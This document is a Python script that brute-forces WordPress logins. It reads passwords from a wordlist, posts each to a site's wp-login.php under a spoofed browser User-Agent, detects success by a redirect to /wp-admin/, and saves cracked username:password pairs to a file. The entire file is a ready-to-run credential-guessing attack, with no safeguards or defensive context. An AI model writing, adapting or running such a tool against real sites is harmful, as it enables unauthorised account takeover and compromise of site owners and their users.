import time
import requests


def success_login(site, username, password, output_file):
    """Initialized when a successful login is completed"""

    print(f'Successful login on {site}!\nSuccessful combination: {username}:{password}')
    # write match to file
    f = open(output_file, 'a')
    to_file = f'{username.strip()}:{password.strip()}\n'
    f.writelines(to_file)


def PyLogin(url, username, wordlist, success_site, output_file):
    """The PyLogin function, sends a POST request to a webserver and returns the response URL"""
    startTime = time.time()

    print('Scanning')
    tries = 0
    open_wl = open(wordlist, 'r', encoding='latin-1')
    # start a requests session
    with requests.Session() as s:
        # for each line in wl, attempt a login
        for line in open_wl:
            tries += 1
            password = line.strip()
            headers1 = {"User-Agent":
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                            'AppleWebKit/537.36 (KHTML, like Gecko) '
                            'Chrome/79.0.3945.117 Safari/537.36',
                        'Cookie': 'wordpress_test_cookie=WP Cookie check'}

            datas = {
                'log': username, 'pwd': password, 'wp-submit': 'Log In',
                'redirect_to': success_site, 'testcookie': '1'
            }
            # post to website
            s.post(url, headers=headers1, data=datas)
            # get response
            resp = s.get(success_site)
            # if resp.url is success site, initialize success_login function and break
            if resp.url == success_site:
                success_login(url, username, password, output_file)
                break
            # if not print out amount of tries
            else:

                if (tries % 100) == 0:
                    print(f'{tries} tries attempted!')
        print(f'Scan finished in {time.time() - startTime}\n\nResults written to '
              f'{output_file}\n')


def start():
    """Asks for information related to scan"""
    site = input('Site to log in to: ')
    print('Checking URL...')
    # attempt to access site, ensuring it exists
    try:
        requests.get(site)
    except requests.exceptions.MissingSchema:
        print('This does not appear to be a valid website! Remember the ')
        start()

    username = input('Username: ')
    wordlist = input('Wordlist: ')
    try:
        f = open(wordlist, 'r')
    except:
        print('File does not exist!')
        start()
    output_file = input('Output File: ')
    wp_admin = site + '/wp-admin/'
    URL = site + '/wp-login.php'

    PyLogin(URL, username, wordlist, wp_admin, output_file)


# runs the script
if __name__ == '__main__':
    start()
